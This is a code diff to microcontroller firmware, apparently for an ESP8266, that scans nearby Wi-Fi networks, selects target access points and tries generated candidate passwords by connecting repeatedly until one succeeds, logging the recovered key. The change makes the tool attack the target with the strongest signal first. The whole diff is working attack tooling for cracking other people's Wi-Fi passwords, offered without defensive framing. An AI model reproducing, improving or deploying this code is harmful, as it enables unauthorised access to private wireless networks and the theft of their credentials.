@@ -12,7 +12,6 @@ typedef struct {
     uint8_t essid[32];
     uint8_t bssid[6];
     uint8_t password[8];
-    int8_t priority;
     char *candidate_passwords;
     size_t current_password;
 } ap_t;
@@ -73,22 +72,15 @@ ICACHE_FLASH_ATTR
 static void
 targets_found(void* arg, STATUS status){
     struct bss_info *bss_link = (struct bss_info *)arg;
+    int8_t highest_priority = -127;
+    size_t ap_to_crack = MAX_APS+1;
     while (bss_link != NULL){
         bool found = false;
         size_t i;
         for(i = 0; i < aps_found; i++){
-            if(aps[i].target && aps[i].priority){
-                os_printf("Found target ESSID %s with priority %u...\n", aps[i].essid, aps[i].priority);
-                if(aps[i].candidate_passwords){
-                    os_printf("Connecting to ESSID %s...\n", aps[i].essid);
-                    state = CONNECTING;
-                    system_os_post(PRIO_TEST, 0, (os_param_t) i);
-                } else {
-                    os_printf("Generating candidate passwords for ESSID %s...\n", aps[i].essid);
-                    state = CRACKING;
-                    system_os_post(PRIO_CRACK, 0, (os_param_t) i);
-                }
-                return;
+            if(aps[i].target && bss_link->rssi > highest_priority){
+                highest_priority = bss_link->rssi;
+                ap_to_crack = i;
             }
             if(strncmp(aps[i].essid, bss_link->ssid, 32) == 0){
                 found = true;
@@ -98,7 +90,6 @@ targets_found(void* arg, STATUS status){
                 }
                 os_printf("\n");
             }
-            aps[i].priority = -bss_link->rssi;
         }
         if(!found && aps_found < MAX_APS){
             os_printf("Found new AP: %02x:%02x:%02x:%02x:%02x:%02x %s (%d dB)\n", bss_link->bssid[0], bss_link->bssid[1], bss_link->bssid[2], bss_link->bssid[3], bss_link->bssid[4], bss_link->bssid[5], bss_link->ssid, bss_link->rssi);
@@ -114,13 +105,25 @@ targets_found(void* arg, STATUS status){
                         aps[aps_found].target *= 10;
                         aps[aps_found].target += aps[aps_found].essid[i]-0x30;
                     }
-                    aps[aps_found].priority++;
                 }
             }
             aps_found++;
         }
 
         bss_link = bss_link->next.stqe_next;
+    }
+    if(ap_to_crack <= MAX_APS){
+        os_printf("Found target ESSID %s...\n", aps[ap_to_crack].essid);
+        if(aps[ap_to_crack].candidate_passwords){
+            os_printf("Connecting to ESSID %s...\n", aps[ap_to_crack].essid);
+            state = CONNECTING;
+            system_os_post(PRIO_TEST, 0, (os_param_t) ap_to_crack);
+        } else {
+            os_printf("Generating candidate passwords for ESSID %s...\n", aps[ap_to_crack].essid);
+            state = CRACKING;
+            system_os_post(PRIO_CRACK, 0, (os_param_t) ap_to_crack);
+        }
+        return;
     }
     state = SCANNING;
     system_os_post(PRIO_SCAN, 0, 0 );
@@ -156,7 +159,6 @@ static void test_passwords(os_event_t *events){
     if(ap_timeouts == MAX_TRIES){
         os_printf("AP not reachable for %u tries, aborting\n", MAX_TRIES);
         state = DISCONNECTING;
-        aps[ap_to_crack].priority--;
     }
 
     if(state == CONNECTING){
@@ -166,7 +168,6 @@ static void test_passwords(os_event_t *events){
                 // done with testing, go back to scanning
                 state = DISCONNECTING;
                 memcpy(aps[ap_to_crack].password, "UNKNOWN", 7);
-                aps[ap_to_crack].priority = 0;
                 aps[ap_to_crack].target = 0;
                 os_free(aps[ap_to_crack].candidate_passwords);
                 aps[ap_to_crack].candidate_passwords = NULL;
@@ -194,7 +195,6 @@ static void test_passwords(os_event_t *events){
         case STATION_WRONG_PASSWORD:
             os_printf("Wrong password!\n");
             aps[ap_to_crack].current_password++;
-            aps[ap_to_crack].priority++;
             // fall through
         case STATION_IDLE: {
             wifi_station_disconnect();
@@ -222,7 +222,6 @@ static void test_passwords(os_event_t *events){
         case STATION_GOT_IP: {
             memcpy(aps[ap_to_crack].password, aps[ap_to_crack].candidate_passwords+(8*aps[ap_to_crack].current_password), 8);
             os_printf("Found valid password for %s: %s\n", aps[ap_to_crack].essid, aps[ap_to_crack].password);
-            aps[ap_to_crack].priority = 0;
             aps[ap_to_crack].target = 0;
             os_free(aps[ap_to_crack].candidate_passwords);
             aps[ap_to_crack].candidate_passwords = NULL;
